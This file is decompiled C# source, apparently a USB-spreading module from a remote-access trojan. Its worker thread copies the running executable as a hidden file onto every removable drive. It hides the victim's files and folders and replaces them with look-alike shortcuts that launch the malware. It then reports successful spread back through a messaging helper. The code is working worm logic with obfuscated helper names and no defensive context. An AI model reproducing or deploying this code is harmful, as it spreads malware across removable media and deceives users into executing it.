using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class SPUSB
{
	public static string ExeName;

	private static Thread thread_0;

	static SPUSB()
	{
		Class13.F2pn6WrzFkP6h();
		ExeName = Class6.string_8;
	}

	public static void Enable()
	{
		thread_0 = new Thread(WorkThread);
		thread_0.Start();
	}

	public static void Disable()
	{
		thread_0.Abort();
	}

	public static void WorkThread()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		string text = default(string);
		DriveInfo[] drives = default(DriveInfo[]);
		object objectValue2 = default(object);
		DriveInfo[] array = default(DriveInfo[]);
		int num5 = default(int);
		DriveInfo driveInfo = default(DriveInfo);
		string[] files = default(string[]);
		int num6 = default(int);
		string text2 = default(string);
		int num7 = default(int);
		string[] directories = default(string[]);
		string text3 = default(string);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000a;
					case 976:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0012;
							case 4:
								goto IL_0029;
							case 5:
								goto IL_0045;
							case 6:
								goto IL_0062;
							case 7:
								goto IL_0072;
							case 8:
								goto IL_0094;
							case 9:
								goto IL_00a8;
							case 10:
								goto IL_00cb;
							case 12:
								goto IL_00ed;
							case 13:
								goto IL_0104;
							case 16:
								goto IL_0114;
							case 17:
								goto IL_013b;
							case 18:
								goto IL_0158;
							case 19:
								goto IL_017f;
							case 14:
							case 15:
								goto IL_019f;
							case 21:
								goto IL_01d9;
							case 22:
								goto IL_01f4;
							case 23:
								goto IL_0200;
							case 24:
								goto IL_020b;
							case 25:
								goto IL_0239;
							case 26:
								goto IL_0260;
							case 27:
								goto IL_027d;
							case 28:
								goto IL_02ac;
							case 29:
								goto IL_02c7;
							case 30:
								goto IL_0303;
							case 31:
							case 32:
								goto IL_0319;
							case 11:
							case 20:
								goto IL_0327;
							default:
								goto end_IL_0001;
							case 33:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_027d:
						num = 27;
						NewLateBinding.LateSet(objectValue, (Type)null, "IconLocation", new object[1] { Environment.GetEnvironmentVariable("windir") + "\\System32\\Shell32.dll, 3" }, (string[])null, (Type[])null);
						goto IL_02ac;
						IL_0260:
						num = 26;
						NewLateBinding.LateSet(objectValue, (Type)null, "WorkingDirectory", new object[1] { text }, (string[])null, (Type[])null);
						goto IL_027d;
						IL_000a:
						num = 2;
						drives = DriveInfo.GetDrives();
						goto IL_0012;
						IL_0012:
						num = 3;
						objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
						goto IL_0029;
						IL_0029:
						num = 4;
						array = drives;
						num5 = 0;
						goto IL_0031;
						IL_0031:
						if (num5 < array.Length)
						{
							driveInfo = array[num5];
							goto IL_0045;
						}
						goto end_IL_0001_2;
						IL_02ac:
						num = 28;
						NewLateBinding.LateCall(objectValue, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						goto IL_02c7;
						IL_0045:
						num = 5;
						if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
						{
							goto IL_0062;
						}
						goto IL_0319;
						IL_02c7:
						num = 29;
						Class6.smethod_26("MSG" + Class6.string_12 + "USB was detected! " + Class6.string_4 + " spreaded successfully!");
						goto IL_0303;
						IL_0062:
						num = 6;
						text = driveInfo.RootDirectory.ToString();
						goto IL_0072;
						IL_0072:
						num = 7;
						File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text + ExeName);
						goto IL_0094;
						IL_0094:
						num = 8;
						File.SetAttributes(text + ExeName, FileAttributes.Hidden);
						goto IL_00a8;
						IL_00a8:
						num = 9;
						files = Directory.GetFiles(text);
						num6 = 0;
						goto IL_00b7;
						IL_00b7:
						if (num6 < files.Length)
						{
							text2 = files[num6];
							goto IL_00cb;
						}
						goto IL_01d9;
						IL_0303:
						num = 30;
						num7++;
						goto IL_030c;
						IL_00cb:
						num = 10;
						if (Operators.CompareString(Path.GetFileNameWithoutExtension(text2), Path.GetFileNameWithoutExtension(ExeName), false) != 0)
						{
							goto IL_00ed;
						}
						goto IL_0327;
						IL_00ed:
						num = 12;
						if (!text2.Contains(".lnk"))
						{
							goto IL_0104;
						}
						goto IL_019f;
						IL_0104:
						num = 13;
						File.SetAttributes(text2, FileAttributes.Hidden);
						goto IL_019f;
						IL_019f:
						num = 15;
						objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "CreateShortcut", new object[1] { text + Path.GetFileNameWithoutExtension(text2) + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
						goto IL_0114;
						IL_0114:
						num = 16;
						NewLateBinding.LateSet(objectValue, (Type)null, "TargetPath", new object[1] { text + ExeName }, (string[])null, (Type[])null);
						goto IL_013b;
						IL_013b:
						num = 17;
						NewLateBinding.LateSet(objectValue, (Type)null, "WorkingDirectory", new object[1] { text }, (string[])null, (Type[])null);
						goto IL_0158;
						IL_0158:
						num = 18;
						NewLateBinding.LateSet(objectValue, (Type)null, "IconLocation", new object[1] { text2 + ", 0" }, (string[])null, (Type[])null);
						goto IL_017f;
						IL_017f:
						num = 19;
						NewLateBinding.LateCall(objectValue, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						goto IL_0327;
						IL_0327:
						num = 20;
						num6++;
						goto IL_00b7;
						IL_01d9:
						num = 21;
						directories = Directory.GetDirectories(text);
						num7 = 0;
						goto IL_030c;
						IL_030c:
						if (num7 < directories.Length)
						{
							text3 = directories[num7];
							goto IL_01f4;
						}
						goto IL_0319;
						IL_0319:
						num = 32;
						num5++;
						goto IL_0031;
						IL_01f4:
						num = 22;
						directoryInfo = new DirectoryInfo(text3);
						goto IL_0200;
						IL_0200:
						num = 23;
						directoryInfo.Attributes = FileAttributes.Hidden;
						goto IL_020b;
						IL_020b:
						num = 24;
						objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "CreateShortcut", new object[1] { text3 + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
						goto IL_0239;
						IL_0239:
						num = 25;
						NewLateBinding.LateSet(objectValue, (Type)null, "TargetPath", new object[1] { text + ExeName }, (string[])null, (Type[])null);
						goto IL_0260;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 976;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
